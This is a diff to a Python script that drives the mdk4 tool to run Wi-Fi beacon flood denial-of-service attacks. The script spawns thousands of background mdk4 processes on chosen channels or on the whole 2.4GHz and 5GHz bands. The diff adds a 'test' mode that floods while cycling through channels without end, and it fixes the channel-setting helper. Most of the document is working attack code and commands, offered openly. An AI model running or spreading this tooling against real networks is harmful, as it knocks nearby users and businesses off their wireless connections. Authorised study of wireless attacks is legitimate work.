@@ -55,8 +55,8 @@ Enter selected target for beacon flood DoS attack: """)
 	if bfType.casefold() == "bg".casefold():
 		print("Started attack on 2.4GHz band")
 		for chanIndex in range(1980):
-			#subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
-			subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%11]} > /dev/null &", shell=True, executable="/bin/bash")
+			subprocess.run(f"mdk4 wlan0 b -h > /dev/null &", shell=True, executable="/bin/bash")
+			#subprocess.run(f"mdk4 wlan0 b -c {channel_list[chanIndex%11]} > /dev/null &", shell=True, executable="/bin/bash")
 		exit = input('Input anything to end attack: ')
 		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
 		print("Ended attack on 2.4GHz band")
@@ -79,12 +79,23 @@ Enter selected target for beacon flood DoS attack: """)
 		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
 		print("Ended attack on 2.4GHZ and 5GHz bands")
 		return False
+	if bfType.casefold() == "t".casefold():
+		print("Testing BF DoS")
+		index = 0
+		Set_Channel(channel_list[index])
+		for i in range(2000):
+			subprocess.run("mdk4 wlan0 b > /dev/null &", shell=True, executable="/bin/bash")
+		while True:
+			time.sleep(0.05)
+			index += 1
+			Set_Channel(channel_list[index%11])
 	if bfType.casefold() == "q".casefold():
 		return False
 	try:
 		channel = int(bfType)
 		if channel in channel_list:
 			print(f"Started attack on channel {channel}")
+			Set_Channel(channel)
 			for i in range(2000):
 				subprocess.run(f"mdk4 wlan0 b -c {channel} > /dev/null &", shell=True, executable="/bin/bash")
 			exit = input('Input anything to end attack: ')
@@ -111,7 +122,7 @@ def Set_Managed():
 	subprocess.run("systemctl start NetworkManager", shell=True, executable="/bin/bash")
 
 def Set_Channel(channel):
-	change_channel="sudo iwconfig wlan0 channel "+channel
+	change_channel="sudo iwconfig wlan0 channel " + str(channel)
 	subprocess.run(change_channel, shell=True, executable="/bin/bash")
 
 def Print_Options():
